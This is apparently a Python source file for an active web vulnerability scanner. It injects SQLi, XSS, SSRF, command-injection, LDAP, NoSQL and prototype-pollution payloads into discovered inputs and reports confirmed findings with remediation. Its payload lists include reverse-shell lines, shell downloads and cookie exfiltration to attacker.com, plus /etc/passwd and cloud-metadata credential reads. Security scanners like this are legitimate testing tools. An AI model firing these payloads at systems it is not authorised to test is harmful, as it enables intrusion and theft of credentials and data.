"""
fuzzer_scanner.py — Active XSS & SQL Injection Fuzzer
=====================================================
Senior Security Engineer-grade injection testing module.

This scanner:
  1. Crawls the target page recursively using WebCrawler.
  2. Injects curated SQLi and XSS payloads into every discovered input vector.
  3. Analyses HTTP responses for database error signatures (MySQL, PostgreSQL,
     MSSQL, Oracle, SQLite) and reflected XSS payload markers.
  4. Performs boolean-based blind SQL injection checks.
  5. Reports each confirmed injection point with severity, CVSS, evidence,
     and remediation guidance.
"""
import urllib.request, urllib.error, urllib.parse, ssl, re, time
from html.parser import HTMLParser
from scanners.base_scanner import BaseScanner
from utils.web_crawler import WebCrawler
from utils.fuzzer_engine import ContextAwareFuzzer, TYPE_MUTATIONS

# ──────────────────────────────────────────────────────────────────────
# Payload Sets
# ──────────────────────────────────────────────────────────────────────
SQLI_PAYLOADS = [
    # Classic auth-bypass / error-based
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    '" OR "1"="1"',
    "1' AND 1=1 --",
    "1' AND 1=0 --",
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
    "'; WAITFOR DELAY '0:0:3' --",
    "1; SELECT SLEEP(3) --",
    "admin'--",
    "admin' #",
    "admin' --",
    "' OR 1=1#",
    "' OR 1=1--",
    '" OR 1=1--',
    "\" OR \"1\"=\"1",
    "' OR 'a'='a",
    "') OR ('1'='1",
    "1' ORDER BY 1 --",
    "1' ORDER BY 100 --",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION())) --",
]

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><script>alert(1)</script>',
    "'\"><img src=x onerror=alert(1)>",
    '<svg onload=alert(1)>',
    '"><svg/onload=alert(1)>',
    "javascript:alert(1)",
    '<img src=x onerror=alert("XSS")>',
    '{{7*7}}',                          # SSTI probe
    '${7*7}',                           # Template injection probe
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '" onfocus="alert(1)" autofocus="',
    "';alert(1)//",
    '<details open ontoggle=alert(1)>',
    
    # Additional payloads from user XSS script
    "<script>alert('XSS')</script>",
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<iframe src='javascript:alert(\"XSS\")'>",
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
]

# Advanced Red-Team Payloads
TIME_BASED_SQLI = [
    "SLEEP(5)/*",
    "' OR SLEEP(5)='",
    "pg_sleep(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "'; SELECT pg_sleep(5)--",
    "1; SELECT SLEEP(5)#",
    "' OR BENCHMARK(5000000,MD5(1))--",
    "1 AND SLEEP(5)#",
    "'; EXEC xp_cmdshell('ping 127.0.0.1 -n 5')--"
]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1:80",
    "http://localhost:22",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/user-data",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://0177.0.0.1",
    "http://0x7f.0.0.1",
    "http://2130706433",
    "file:///etc/passwd",
    "file:///windows/win.ini"
]

CMD_INJECTION_PAYLOADS = [
    "; cat /etc/passwd",
    "| type C:\\Windows\\win.ini",
    "`id`",
    "$(whoami)",
    "; ls -la",
    "| dir",
    "&& whoami",
    "; curl http://attacker.com/$(whoami)",
    "| powershell -c 'Get-Process'",
    "`nslookup attacker.com`",
    "; wget http://attacker.com/shell.sh",
    "$(curl http://attacker.com)",
    "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
    "| nc attacker.com 4444 -e /bin/bash"
]

# Advanced XSS Payloads for DOM-based and stored XSS
ADVANCED_XSS_PAYLOADS = [
    "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
    "<img src=x onerror='fetch(\"http://attacker.com/?c=\"+document.cookie)'>",
    "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "<details open ontoggle=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<object data='javascript:alert(1)'>",
    "<embed src='javascript:alert(1)'>",
    "<math><maction actiontype='statusline' onactivate=alert(1)>click</maction></math>",
    "<form><button formaction='javascript:alert(1)'>XSS</button></form>",
    "<input type='text' onfocus='alert(1)' autofocus>",
    "<select onfocus='alert(1)' autofocus><option>XSS</option></select>",
    "<textarea onfocus='alert(1)' autofocus>XSS</textarea>",
    "<keygen onfocus='alert(1)' autofocus>",
    "<video><source onerror='alert(1)'>",
    "<audio src=x onerror='alert(1)'>",
    "<marquee onstart='alert(1)'>XSS</marquee>",
    "<isindex action='javascript:alert(1)' type='submit'>",
    "<iframe src='data:text/html,<script>alert(1)</script>'>"
]

# LDAP Injection Payloads
LDAP_INJECTION_PAYLOADS = [
    "*)(uid=*",
    "*)(&",
    "*)(|(objectClass=*)",
    "*)(|(password=*",
    "*))%00",
    "*)(&(|(objectClass=*",
    "*)(|(cn=*",
    "*)(|(sn=*"
]

# NoSQL Injection Payloads
NOSQL_INJECTION_PAYLOADS = [
    "' || '1'=='1",
    "' && '1'=='1",
    "'; return true;//",
    "' && this.password.match(/.*/)//",
    "' && this.password.match(/^a/)//",
    "' && this.password.length>0//",
    "' && this.password.length<10//",
    "' && this.password=='admin'//",
    "' || true)//",
    "' && true)//"
]

# Prototype Pollution Payloads
PROTOTYPE_POLLUTION_PAYLOADS = [
    '{"__proto__":{"admin":true}}',
    '{"constructor":{"prototype":{"admin":true}}}',
    '{"__proto__":{"isAdmin":true}}',
    '{"__proto__":{"auth":"admin"}}',
    '{"constructor":{"prototype":{"auth":"admin"}}}'
]

# Database error signatures — evidence of SQL injection
DB_ERROR_PATTERNS = [
    (r"You have an error in your SQL syntax",            "MySQL"),
    (r"Warning.*mysql_",                                 "MySQL"),
    (r"MySQLSyntaxErrorException",                       "MySQL"),
    (r"valid MySQL result",                              "MySQL"),
    (r"PostgreSQL.*ERROR",                               "PostgreSQL"),
    (r"pg_query\(\).*failed",                            "PostgreSQL"),
    (r"PSQLException",                                   "PostgreSQL"),
    (r"unterminated quoted string",                      "PostgreSQL"),
    (r"Microsoft OLE DB Provider for SQL Server",        "MSSQL"),
    (r"Unclosed quotation mark after the character string", "MSSQL"),
    (r"Microsoft SQL Native Client error",               "MSSQL"),
    (r"ODBC SQL Server Driver",                          "MSSQL"),
    (r"ORA-\d{5}",                                       "Oracle"),
    (r"Oracle error",                                    "Oracle"),
    (r"SQLite3::SQLException",                           "SQLite"),
    (r"SQLITE_ERROR",                                    "SQLite"),
    (r"near \".*\": syntax error",                       "SQLite"),
    (r"SQL syntax.*MariaDB",                             "MariaDB"),
    (r"javax\.persistence\.PersistenceException",        "JPA/Hibernate"),
    (r"org\.hibernate\.exception",                       "Hibernate"),
]

# ──────────────────────────────────────────────────────────────────────
# HTML Form Parser (Retained for backwards compatibility)
# ──────────────────────────────────────────────────────────────────────
class FormParser(HTMLParser):
    """Parse HTML to extract <form> elements with their <input>/<textarea> fields."""

    def __init__(self):
        super().__init__()
        self.forms = []
        self._current_form = None

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == "form":
            self._current_form = {
                "action": attrs_dict.get("action", ""),
                "method": attrs_dict.get("method", "GET").upper(),
                "inputs": [],
            }
        elif tag in ("input", "textarea", "select") and self._current_form is not None:
            input_type = attrs_dict.get("type", "text").lower()
            # Skip submit/button/hidden/file inputs
            if input_type not in ("submit", "button", "image", "file", "hidden", "reset"):
                name = attrs_dict.get("name", attrs_dict.get("id", ""))
                if name:
                    self._current_form["inputs"].append({
                        "name": name,
                        "type": input_type,
                        "value": attrs_dict.get("value", ""),
                    })
            # Also capture hidden fields for completeness but don't fuzz them
            elif input_type == "hidden":
                name = attrs_dict.get("name", "")
                if name:
                    self._current_form["inputs"].append({
                        "name": name,
                        "type": "hidden",
                        "value": attrs_dict.get("value", ""),
                    })

    def handle_endtag(self, tag):
        if tag == "form" and self._current_form is not None:
            self.forms.append(self._current_form)
            self._current_form = None


# ──────────────────────────────────────────────────────────────────────
# Scanner Implementation
# ──────────────────────────────────────────────────────────────────────
class FuzzerScanner(BaseScanner):
    SCANNER_NAME = "XSS & SQL Injection Fuzzer"

    def __init__(self, scan_id, target, domain, **kwargs):
        super().__init__(scan_id, target, domain, **kwargs)
        self._ctx = ssl.create_default_context()
        self._ctx.check_hostname = False
        self._ctx.verify_mode = ssl.CERT_NONE
        self._headers = {"User-Agent": "LarShield/2.0 Fuzzer"}
        if self.auth_headers:
            self._headers.update(self.auth_headers)
            
        self._tested_vectors = 0
        self._sqli_found = 0
        self._xss_found = 0
        self.max_depth = kwargs.get("max_depth", 1)
        self.delay = kwargs.get("delay", 0.2)
        self.exclude_paths = kwargs.get("exclude_paths", [])
        self.red_team = kwargs.get("red_team", False)
        self._fuzzer = ContextAwareFuzzer(self._fuzzer_req)

    def _sqli_limit(self):
        return len(SQLI_PAYLOADS) if self.red_team else 8

    def _xss_limit(self):
        return len(XSS_PAYLOADS) if self.red_team else 6

    def _get(self, url, timeout=8):
        self._throttle()
        try:
            req = urllib.request.Request(url, headers=self._headers)
            with urllib.request.urlopen(req, timeout=timeout, context=self._ctx) as resp:
                return resp.read(131072).decode("utf-8", errors="ignore"), resp.status
        except urllib.error.HTTPError as e:
            body = e.read(131072).decode("utf-8", errors="ignore") if e.fp else ""
            return body, e.code
        except Exception as e:
            self.log("ERROR", f"[Fuzzer] _get error: {e}")
            return "", 0

    def _post(self, url, data, timeout=8):
        self._throttle()
        try:
            encoded = urllib.parse.urlencode(data).encode("utf-8")
            req = urllib.request.Request(url, data=encoded, headers={
                **self._headers,
                "Content-Type": "application/x-www-form-urlencoded"
            })
            with urllib.request.urlopen(req, timeout=timeout, context=self._ctx) as resp:
                return resp.read(131072).decode("utf-8", errors="ignore"), resp.status
        except urllib.error.HTTPError as e:
            body = e.read(131072).decode("utf-8", errors="ignore") if e.fp else ""
            return body, e.code
        except Exception as e:
            self.log("ERROR", f"[Fuzzer] _post error: {e}")
            return "", 0

    # ── SQLi Detection ────────────────────────────────────────────────
    def _check_sqli(self, body, payload, vector_desc):
        for pattern, db_type in DB_ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                self._sqli_found += 1
                self.log("CRITICAL",
                         f"[Fuzzer] SQL INJECTION CONFIRMED! Vector: {vector_desc} | "
                         f"DB: {db_type} | Payload: {payload[:60]}")
                self.add_vuln(
                    title=f"SQL Injection — {db_type} Error-Based",
                    severity="Critical", category="Injection", cvss_score=9.8,
                    description=(
                        f"A SQL injection vulnerability was confirmed on {vector_desc}.\n"
                        f"Payload: `{payload}`\n"
                        f"The server responded with a {db_type} database error, confirming "
                        f"unsanitised user input is being concatenated into SQL queries.\n\n"
                        f"Impact: An attacker can read/modify/delete all database records, "
                        f"escalate privileges, and potentially achieve remote code execution."
                    ),
                    remediation=(
                        "1. USE PARAMETERISED QUERIES / PREPARED STATEMENTS — never concatenate user input into SQL.\n"
                        "   Python:  cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))\n"
                        "   Node.js: db.query('SELECT * FROM users WHERE id = $1', [userId])\n"
                        "2. Use an ORM (SQLAlchemy, Sequelize, Prisma) that handles parameterisation.\n"
                        "3. Implement input validation — reject characters like ' \" ; -- /* in non-freetext fields.\n"
                        "4. Apply the principle of least privilege to database accounts.\n"
                        "5. Deploy a Web Application Firewall (WAF) as defense-in-depth."
                    ),
                )
                return True
        return False

    def _check_boolean_sqli(self, url, param_name, method='GET', form_inputs=None):
        """Test for boolean-based blind SQL injection by comparing true and false logical states."""
        try:
            if method.upper() == 'GET':
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                
                params_true = {k: v[0] for k, v in params.items()}
                params_true[param_name] = "' AND '1'='1"
                url_true = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params_true)}"
                body_true, _ = self._get(url_true)
                
                params_false = {k: v[0] for k, v in params.items()}
                params_false[param_name] = "' AND '1'='2"
                url_false = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(params_false)}"
                body_false, _ = self._get(url_false)
            else:
                data_true = {}
                if form_inputs:
                    for inp in form_inputs:
                        data_true[inp["name"]] = inp["value"] or "test"
                data_false = data_true.copy()
                data_true[param_name] = "' AND '1'='1"
                data_false[param_name] = "' AND '1'='2"
                body_true, _ = self._post(url, data_true)
                body_false, _ = self._post(url, data_false)
                
            if body_true and body_false and len(body_true) != len(body_false):
                vector_desc = f"{method} {url} → parameter '{param_name}'"
                self._sqli_found += 1
                self.log("CRITICAL", f"[Fuzzer] BLIND SQL INJECTION DETECTED! Vector: {vector_desc}")
                self.add_vuln(
                    title="SQL Injection — Boolean-Based Blind",
                    severity="Critical", category="Injection", cvss_score=9.8,
                    description=(
                        f"A boolean-based blind SQL injection vulnerability was confirmed on {vector_desc}.\n"
                        f"Injecting `' AND '1'='1` and `' AND '1'='2` produced different response lengths "
                        f"({len(body_true)} vs {len(body_false)} bytes), indicating the application's logic "
                        f"is influenced by the SQL query response.\n\n"
                        f"Impact: An attacker can read arbitrary database schema and data by parsing conditional true/false responses."
                    ),
                    remediation=(
                        "1. Use parameterised queries or prepared statements exclusively.\n"
                        "2. Implement strict input validation on all parameters.\n"
                        "3. Apply WAF protections to detect logical inference attacks."
                    )
                )
                return True
        except Exception as e:
            self.log("ERROR", f"[Fuzzer] _check_boolean_sqli error: {e}")
        return False

    # ── XSS Detection ─────────────────────────────────────────────────
    def _check_xss(self, body, payload, vector_desc):
        # Check if the exact payload is reflected unsanitised in the response
        if payload in body:
            self._xss_found += 1
            self.log("CRITICAL",
                     f"[Fuzzer] REFLECTED XSS CONFIRMED! Vector: {vector_desc} | "
                     f"Payload: {payload[:60]}")
            self.add_vuln(
                title="Reflected Cross-Site Scripting (XSS)",
                severity="High", category="Injection", cvss_score=8.1,
                description=(
                    f"A reflected XSS vulnerability was confirmed on {vector_desc}.\n"
                    f"Payload: `{payload}`\n"
                    f"The payload was reflected in the response body without sanitisation, "
                    f"allowing arbitrary JavaScript execution in the victim's browser.\n\n"
                    f"Impact: Session hijacking, credential theft, phishing, defacement, "
                    f"and malware distribution."
                ),
                remediation=(
                    "1. ENCODE ALL OUTPUT — use context-aware output encoding:\n"
                    "   HTML: &lt; &gt; &amp; &quot; &#x27;\n"
                    "   JavaScript: \\xHH escaping\n"
                    "   URL: percent-encoding\n"
                    "2. Implement Content Security Policy (CSP) headers:\n"
                    "   Content-Security-Policy: default-src 'self'; script-src 'self'\n"
                    "3. Use framework auto-escaping (React JSX, Django templates, Jinja2).\n"
                    "4. Validate and sanitise input on the server side.\n"
                    "5. Set HttpOnly and Secure flags on session cookies."
                ),
            )
            return True

        # Check for SSTI (Server-Side Template Injection)
        if payload in ('{{7*7}}', '${7*7}') and '49' in body:
            self._xss_found += 1
            self.log("CRITICAL",
                     f"[Fuzzer] SSTI DETECTED! Template expression evaluated. Vector: {vector_desc}")
            self.add_vuln(
                title="Server-Side Template Injection (SSTI)",
                severity="Critical", category="Injection", cvss_score=9.8,
                description=(
                    f"A Server-Side Template Injection was confirmed on {vector_desc}.\n"
                    f"The expression `{payload}` was evaluated to `49` by the server template engine.\n\n"
                    f"Impact: SSTI can lead to Remote Code Execution (RCE), allowing complete server compromise."
                ),
                remediation=(
                    "1. Never pass user input directly into template rendering.\n"
                    "2. Use a sandboxed template engine or disable dangerous built-in functions.\n"
                    "3. Upgrade to the latest template engine version with SSTI protections."
                ),
            )
            return True

        return False

    # ── Form Fuzzing ──────────────────────────────────────────────────
    def _fuzz_form(self, form, base_url):
        action = form["action"]
        method = form["method"]

        if action.startswith("http"):
            target_url = action
        elif action.startswith("/"):
            parsed = urllib.parse.urlparse(base_url)
            target_url = f"{parsed.scheme}://{parsed.netloc}{action}"
        elif action:
            target_url = base_url.rstrip("/") + "/" + action
        else:
            target_url = base_url

        fuzzable_inputs = [i for i in form["inputs"] if i["type"] != "hidden"]
        if not fuzzable_inputs:
            return

        self.log("INFO", f"[Fuzzer] Testing form: {method} {target_url} — {len(fuzzable_inputs)} input(s)")

        for inp in fuzzable_inputs:
            input_name = inp["name"]
            vector_desc = f"Form {method} {target_url} → input '{input_name}'"

            # SQLi payloads
            sqli_detected = False
            for payload in SQLI_PAYLOADS[:self._sqli_limit()]:
                self._tested_vectors += 1
                data = {i["name"]: (i["value"] or "test") for i in form["inputs"]}
                data[input_name] = payload

                if method == "POST":
                    body, status = self._post(target_url, data)
                else:
                    qs = urllib.parse.urlencode(data)
                    body, status = self._get(f"{target_url}?{qs}")

                if body and self._check_sqli(body, payload, vector_desc):
                    sqli_detected = True
                    break  # One confirmed finding per input is sufficient

            if not sqli_detected:
                self._check_boolean_sqli(target_url, input_name, method, form["inputs"])

            # Time-based blind SQLi — always active (no response difference, timing-only)
            if not sqli_detected:
                self._check_time_based_sqli(target_url, input_name, method, form["inputs"])

            # XSS payloads
            for payload in XSS_PAYLOADS[:self._xss_limit()]:
                self._tested_vectors += 1
                data = {i["name"]: (i["value"] or "test") for i in form["inputs"]}
                data[input_name] = payload

                if method == "POST":
                    body, status = self._post(target_url, data)
                else:
                    qs = urllib.parse.urlencode(data)
                    body, status = self._get(f"{target_url}?{qs}")

                if body and self._check_xss(body, payload, vector_desc):
                    break

    # ── URL Parameter Fuzzing ─────────────────────────────────────────
    def _fuzz_url_params(self, url):
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return

        self.log("INFO", f"[Fuzzer] Testing {len(params)} URL parameter(s) on {parsed.path}")

        for param_name in params:
            vector_desc = f"URL param '{param_name}' on {parsed.path}"

            sqli_detected = False
            for payload in SQLI_PAYLOADS[:self._sqli_limit()]:
                self._tested_vectors += 1
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params)}"

                body, status = self._get(test_url)
                if body and self._check_sqli(body, payload, vector_desc):
                    sqli_detected = True
                    break

            if not sqli_detected:
                self._check_boolean_sqli(url, param_name, 'GET')

            # Time-based blind SQLi — always active
            if not sqli_detected:
                self._check_time_based_sqli(url, param_name, 'GET')

            for payload in XSS_PAYLOADS[:self._xss_limit()]:
                self._tested_vectors += 1
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param_name] = payload
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params)}"

                body, status = self._get(test_url)
                if body and self._check_xss(body, payload, vector_desc):
                    break

    # ── Red-Team Payload Probing ──────────────────────────────────────
    def _check_ssrf(self, body, payload, vector_desc):
        indicators = ["ami-id", "instance-id", "root:x:0:0", "localhost", "127.0.0.1"]
        if any(ind in body for ind in indicators):
            self.log("CRITICAL", f"[Fuzzer] SSRF INDICATOR! Vector: {vector_desc} | Payload: {payload[:60]}")
            self.add_vuln(
                title="Server-Side Request Forgery (SSRF)",
                severity="Critical", category="Injection", cvss_score=9.1,
                description=(
                    f"A potential SSRF vulnerability was detected on {vector_desc}.\n"
                    f"Payload: `{payload}`\n"
                    f"The server response contained internal network or metadata indicators, "
                    f"suggesting the application fetched attacker-controlled URLs server-side.\n\n"
                    f"Impact: Access to internal services, cloud metadata theft, and lateral movement."
                ),
                remediation=(
                    "1. Block requests to private IP ranges and link-local addresses.\n"
                    "2. Use an allowlist of permitted outbound domains.\n"
                    "3. Disable URL fetching features or proxy through a hardened egress gateway."
                ),
            )
            return True
        return False

    def _check_cmd_injection(self, body, payload, vector_desc):
        cmd_indicators = ["uid=", "gid=", "groups=", "[boot loader]", "root:", "www-data"]
        if any(ind in body for ind in cmd_indicators):
            self.log("CRITICAL", f"[Fuzzer] COMMAND INJECTION! Vector: {vector_desc} | Payload: {payload[:60]}")
            self.add_vuln(
                title="OS Command Injection",
                severity="Critical", category="Injection", cvss_score=9.8,
                description=(
                    f"A command injection vulnerability was detected on {vector_desc}.\n"
                    f"Payload: `{payload}`\n"
                    f"The response contained OS-level output, indicating shell command execution.\n\n"
                    f"Impact: Full server compromise via arbitrary command execution."
                ),
                remediation=(
                    "1. Never pass user input to shell interpreters.\n"
                    "2. Use language-native APIs instead of os.system/subprocess with user data.\n"
                    "3. Apply strict input validation and run processes with least privilege."
                ),
            )
            return True
        return False

    def _check_time_based_sqli(self, url, param_name, method='GET', form_inputs=None):
        for payload in TIME_BASED_SQLI[:3]:
            try:
                start = time.time()
                if method.upper() == 'GET':
                    parsed = urllib.parse.urlparse(url)
                    params = urllib.parse.parse_qs(parsed.query)
                    test_params = {k: v[0] for k, v in params.items()}
                    test_params[param_name] = payload
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params)}"
                    self._get(test_url, timeout=12)
                else:
                    data = {i["name"]: (i["value"] or "test") for i in (form_inputs or [])}
                    data[param_name] = payload
                    self._post(url, data, timeout=12)
                elapsed = time.time() - start
                if elapsed >= 4.5:
                    vector_desc = f"{method} {url} → parameter '{param_name}'"
                    self._sqli_found += 1
                    self.log("CRITICAL", f"[Fuzzer] TIME-BASED SQLi! Vector: {vector_desc} ({elapsed:.1f}s delay)")
                    self.add_vuln(
                        title="SQL Injection — Time-Based Blind",
                        severity="Critical", category="Injection", cvss_score=9.8,
                        description=(
                            f"A time-based blind SQL injection was detected on {vector_desc}.\n"
                            f"Payload: `{payload}` caused a {elapsed:.1f}s response delay.\n\n"
                            f"Impact: Attackers can exfiltrate data bit-by-bit using timing side-channels."
                        ),
                        remediation=(
                            "1. Use parameterised queries exclusively.\n"
                            "2. Set aggressive query timeouts at the database layer.\n"
                            "3. Deploy WAF rules for sleep/waitfor/benchmark patterns."
                        ),
                    )
                    return True
            except Exception as e:
                self.log("ERROR", f"[Fuzzer] _check_time_based_sqli error: {e}")
                continue
        return False

    def _fuzzer_req(self, url, params, headers=None):
        data = urllib.parse.urlencode(params).encode("utf-8") if params else None
        merged = {"Content-Type": "application/x-www-form-urlencoded"}
        if headers:
            merged.update(headers)
        body, status = self._make_request(url, method="POST", data=data, headers=merged, timeout=8)
        return body or "", status

    def _context_fuzz(self):
        crawl_results = self.discovery_context or {"forms": [], "urls": []}
        all_params = {}
        for form in crawl_results.get("forms", []):
            for inp in form.get("inputs", []):
                if inp.get("type") != "hidden":
                    all_params[inp["name"]] = inp.get("value", "test")
        for url_entry in crawl_results.get("urls", []):
            url = url_entry.get("url") if isinstance(url_entry, dict) else url_entry
            parsed = urllib.parse.urlparse(url)
            qs_params = urllib.parse.parse_qs(parsed.query)
            for k, v in qs_params.items():
                if k not in all_params:
                    all_params[k] = v[0] if v else "test"

        if not all_params:
            self.log("INFO", "[Fuzzer] No parameters discovered for context-aware fuzzing")
            return

        self.log("INFO", f"[Fuzzer] Context-aware fuzzing {len(all_params)} parameter(s) with {sum(len(v) for v in TYPE_MUTATIONS.values())} mutation(s)")
        self._fuzzer.fuzz(self.target, all_params)
        baseline_body, _ = self._make_request(self.target, timeout=8)
        baseline_length = len(baseline_body or "")
        anomalies = self._fuzzer.anomalies(baseline_length)
        for anom in anomalies:
            self.log("WARNING", f"[Fuzzer] Context-aware anomaly — {anom['param']} ({anom['type']}) mutation={anom['mutation']} status={anom['status']} length={anom['length']}")
            self.add_vuln(
                title=f"Context-Aware Fuzzer: Anomalous '{anom['param']}' ({anom['mutation']})",
                severity="Medium",
                category="Injection",
                cvss_score=6.5,
                description=(
                    f"Parameter '{anom['param']}' (classified as '{anom['type']}') "
                    f"returned an anomalous response when mutated with '{anom['mutation']}' "
                    f"(value: {anom['value']}). "
                    f"HTTP {anom['status']}, response length {anom['length']} bytes."
                ),
                remediation="Validate and sanitize all input parameters server-side. Use parameterized queries, input type enforcement, and context-aware output encoding.",
                cwe_ids=["CWE-20"],
                owasp_category="A03:2021 – Injection",
            )

    def _fuzz_red_team_params(self, url, params, method='GET', form_inputs=None):
        ssrf_params = {"url", "redirect", "next", "return", "ref", "callback", "dest", "target", "uri", "path", "file"}
        cmd_params = {"cmd", "command", "exec", "run", "ping", "host", "ip", "query"}

        for param_name in params:
            vector_base = f"{method} {url} → parameter '{param_name}'"
            if param_name.lower() in ssrf_params:
                for payload in SSRF_PAYLOADS:
                    self._tested_vectors += 1
                    if method.upper() == 'GET':
                        parsed = urllib.parse.urlparse(url)
                        test_params = {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
                        test_params[param_name] = payload
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params)}"
                        body, _ = self._get(test_url)
                    else:
                        data = {i["name"]: (i["value"] or "test") for i in (form_inputs or [])}
                        data[param_name] = payload
                        body, _ = self._post(url, data)
                    if body and self._check_ssrf(body, payload, vector_base):
                        break

            if param_name.lower() in cmd_params:
                for payload in CMD_INJECTION_PAYLOADS[:3]:
                    self._tested_vectors += 1
                    if method.upper() == 'GET':
                        parsed = urllib.parse.urlparse(url)
                        test_params = {k: v[0] for k, v in urllib.parse.parse_qs(parsed.query).items()}
                        test_params[param_name] = payload
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params)}"
                        body, _ = self._get(test_url)
                    else:
                        data = {i["name"]: (i["value"] or "test") for i in (form_inputs or [])}
                        data[param_name] = payload
                        body, _ = self._post(url, data)
                    if body and self._check_cmd_injection(body, payload, vector_base):
                        break

            if self.red_team:
                self._check_time_based_sqli(url, param_name, method, form_inputs)
            else:
                # Always do time-based on SSRF/cmd-named params too
                self._check_time_based_sqli(url, param_name, method, form_inputs)

    # ── Common Parameter Probing ──────────────────────────────────────
    def _probe_common_params(self):
        """Inject into common query parameter names even if not found in HTML."""
        common_params = ["id", "q", "search", "query", "page", "name", "user",
                         "email", "redirect", "url", "next", "return", "ref",
                         "callback", "cat", "category", "item", "product"]

        base = self.target.rstrip("/")
        self.log("INFO", f"[Fuzzer] Probing {len(common_params)} common parameters for blind injection...")

        for param in common_params:
            # Quick SQLi probe
            for payload in SQLI_PAYLOADS[:3]:
                self._tested_vectors += 1
                test_url = f"{base}?{param}={urllib.parse.quote(payload)}"
                body, status = self._get(test_url, timeout=5)
                if body and self._check_sqli(body, payload, f"Param probe ?{param}="):
                    break

            # Quick XSS probe
            probe_payload = '<script>alert(1)</script>'
            self._tested_vectors += 1
            test_url = f"{base}?{param}={urllib.parse.quote(probe_payload)}"
            body, status = self._get(test_url, timeout=5)
            if body:
                self._check_xss(body, probe_payload, f"Param probe ?{param}=")

            if self.red_team:
                self._fuzz_red_team_params(
                    f"{base}?{param}=test",
                    {param: ["test"]},
                    'GET'
                )

    # ── Main Entry Point ──────────────────────────────────────────────
    def run(self):
        self.log("INFO", f"[Fuzzer] Starting recursive XSS & SQLi fuzzing on {self.target}...")
        mode = "RED-TEAM" if self.red_team else "STANDARD"
        self.log("INFO",
                 f"[Fuzzer] Mode: {mode} | {len(SQLI_PAYLOADS)} SQLi + {len(XSS_PAYLOADS)} XSS payloads | "
                 f"crawl depth: {self.max_depth}")

        crawl_results = self.discovery_context or {"forms": [], "urls": []}

        try:
            # Step 2: Fuzz all discovered forms
            for form in crawl_results["forms"]:
                self._fuzz_form(form, form["url"])
                if self.red_team and form["inputs"]:
                    param_names = [i["name"] for i in form["inputs"] if i["type"] != "hidden"]
                    if param_names:
                        self._fuzz_red_team_params(
                            form["action"], param_names, form["method"], form["inputs"]
                        )

            # Step 3: Fuzz all discovered URLs (parameters)
            for url_entry in crawl_results["urls"]:
                self._fuzz_url_params(url_entry["url"])
                if self.red_team:
                    parsed = urllib.parse.urlparse(url_entry["url"])
                    params = urllib.parse.parse_qs(parsed.query)
                    if params:
                        self._fuzz_red_team_params(url_entry["url"], params)

        except Exception as e:
            self.log("WARNING", f"[Fuzzer] Unexpected error during scan: {str(e)}")

        # Step 4: Probe common parameter names on the base target URL
        self._probe_common_params()

        # Step 5: Context-aware fuzzing
        self._context_fuzz()

        # Summary
        self.log("SUCCESS" if not self.vulns else "WARNING",
                 f"[Fuzzer] Complete — {self._tested_vectors} vectors tested | "
                 f"{self._sqli_found} SQLi | {self._xss_found} XSS confirmed")
        return self.vulns

if __name__ == "__main__":
    from scanners.fuzzer_scanner import FuzzerScanner
    
    print("=== Running direct test of FuzzerScanner ===")
    scanner = FuzzerScanner(
        scan_id="direct-test-fuzzer",
        target="http://httpbin.org",
        domain="httpbin.org",
        max_depth=1
    )
    
    # Custom logger for console output
    def console_log(level, msg):
        print(f"[{level}] {msg}")
    scanner.log = console_log
    
    findings = scanner.run()
    print("\n=== Scan Complete ===")
    print(f"Vulnerabilities found: {len(findings)}")
    for vuln in findings:
        print(f" - [{vuln['severity']}] {vuln['title']}")
